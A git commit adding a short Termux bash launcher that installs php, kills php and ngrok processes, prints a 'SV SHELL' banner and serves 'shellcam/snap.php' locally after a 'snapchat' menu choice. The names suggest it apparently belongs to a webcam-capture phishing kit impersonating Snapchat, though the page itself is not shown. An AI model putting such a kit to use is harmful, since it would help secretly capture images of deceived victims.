8193eeb8aa47f5fb3be1c5e018128cb1b2cda1cc
kakroot <73759718+kakroot@users.noreply.github.com>
2020-11-25 17:56:23 +0300

    Add files via upload

---
+++ startsVF.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+clear
+pkg install figlet -y 
+pkg install php -y
+clear
+printf "\033[92m"
+figlet SV SHELL
+printf "\033[91m"
+pkill -9 php
+pkill -9 ngrok
+printf "\033[96m [+] Enter 1 to use snapchat :\n\r"
+echo "========================================="
+printf "\033[91m"
+read -p "{-} Enter "  shell
+
+if [ $shell == '1' ];then
+
+printf "Wait to starts :\n\r "
+sleep 3
+printf "\033[93m\n\r"
+
+php -S localhost:8080 shellcam/snap.php
+
+fi
